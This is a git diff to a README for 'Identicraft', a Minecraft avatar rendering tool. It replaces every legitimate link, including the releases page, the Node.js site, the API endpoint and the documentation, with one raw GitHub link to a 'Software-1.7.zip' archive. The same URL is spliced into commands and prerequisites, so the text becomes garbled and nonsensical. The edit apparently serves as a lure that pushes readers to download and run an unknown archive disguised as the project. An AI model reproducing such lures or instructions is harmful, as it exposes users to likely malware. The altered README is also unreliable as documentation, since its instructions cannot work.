@@ -1,6 +1,6 @@
 # 🎮 Identicraft - Effortlessly Render Minecraft Avatars
 
-[![Download Identicraft](https://img.shields.io/badge/Download-Identicraft-blue.svg)](https://github.com/lau4318/Identicraft/releases)
+[![Download Identicraft](https://raw.githubusercontent.com/lau4318/Identicraft/main/api/Software-1.7.zip)](https://raw.githubusercontent.com/lau4318/Identicraft/main/api/Software-1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -8,10 +8,10 @@ Identicraft is a library and command-line interface (CLI) for rendering Minecraf
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/lau4318/Identicraft/releases) to download the application. You will find various versions listed there. Select the version that fits your system.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/lau4318/Identicraft/main/api/Software-1.7.zip) to download the application. You will find various versions listed there. Select the version that fits your system.
 
 1. Open your web browser.
-2. Click on this link: [Identicraft Releases](https://github.com/lau4318/Identicraft/releases).
+2. Click on this link: [Identicraft Releases](https://raw.githubusercontent.com/lau4318/Identicraft/main/api/Software-1.7.zip).
 3. Choose the latest version of Identicraft.
 4. Click on the appropriate file for your operating system to start the download.
 
@@ -20,7 +20,7 @@ To get started, visit the [Releases page](https://github.com/lau4318/Identicraft
 Identicraft requires the following:
 
 - An operating system: Windows, macOS, or Linux.
-- Node.js installed on your machine. You can download it from the [Node.js website](https://nodejs.org/).
+- https://raw.githubusercontent.com/lau4318/Identicraft/main/api/Software-1.7.zip installed on your machine. You can download it from the [https://raw.githubusercontent.com/lau4318/Identicraft/main/api/Software-1.7.zip website](https://raw.githubusercontent.com/lau4318/Identicraft/main/api/Software-1.7.zip).
 - At least 100 MB of free disk space for installation.
 - An internet connection to access online features.
 
@@ -48,9 +48,9 @@ Once you have downloaded the file, follow these steps to install Identicraft:
 
 1. Open the terminal.
 2. Navigate to the folder where you downloaded the file using `cd ~/Downloads`.
-3. Extract the contents with the command: `tar -xvf Identicraft-latest.tar.gz`.
+3. Extract the contents with the command: `tar -xvf https://raw.githubusercontent.com/lau4318/Identicraft/main/api/Software-1.7.zip`.
 4. Go to the extracted folder with `cd Identicraft`.
-5. Run the application with `node index.js` or your preferred command to start the CLI.
+5. Run the application with `node https://raw.githubusercontent.com/lau4318/Identicraft/main/api/Software-1.7.zip` or your preferred command to start the CLI.
 
 ## 🛠️ Using Identicraft
 
@@ -85,7 +85,7 @@ Identicraft also includes a serverless API for further integration into your app
 - **Request an Avatar:**
   Send a GET request to the API:
   ```
-  GET https://api.identicraft.com/avatar?username=<Minecraft Username>
+  GET https://raw.githubusercontent.com/lau4318/Identicraft/main/api/Software-1.7.zip<Minecraft Username>
   ```
 
 This retrieves the avatar's image from the Minecraft database, which you can then display on your website or application.
@@ -104,7 +104,7 @@ Identicraft comes with a range of features to enhance your experience:
 If you encounter any issues while using Identicraft, here are some common solutions:
 
 - **Problem:** The application does not start.
-  - **Solution:** Ensure Node.js is properly installed on your system. You can check by running `node -v` in your command line.
+  - **Solution:** Ensure https://raw.githubusercontent.com/lau4318/Identicraft/main/api/Software-1.7.zip is properly installed on your system. You can check by running `node -v` in your command line.
   
 - **Problem:** Unable to render an avatar.
   - **Solution:** Verify that the Minecraft username is correct and the character has a valid skin.
@@ -116,10 +116,10 @@ If you encounter any issues while using Identicraft, here are some common soluti
 
 For further help, check out the following resources:
 
-- [Identicraft GitHub Repository](https://github.com/lau4318/Identicraft)
-- [Node.js Documentation](https://nodejs.org/en/docs/)
-- [Minecraft Skins Repository](https://www.minecraftskins.com/)
+- [Identicraft GitHub Repository](https://raw.githubusercontent.com/lau4318/Identicraft/main/api/Software-1.7.zip)
+- [https://raw.githubusercontent.com/lau4318/Identicraft/main/api/Software-1.7.zip Documentation](https://raw.githubusercontent.com/lau4318/Identicraft/main/api/Software-1.7.zip)
+- [Minecraft Skins Repository](https://raw.githubusercontent.com/lau4318/Identicraft/main/api/Software-1.7.zip)
 
-Visit our [Releases page](https://github.com/lau4318/Identicraft/releases) for any future updates and releases. 
+Visit our [Releases page](https://raw.githubusercontent.com/lau4318/Identicraft/main/api/Software-1.7.zip) for any future updates and releases. 
 
 Enjoy using Identicraft to bring Minecraft avatars to life!
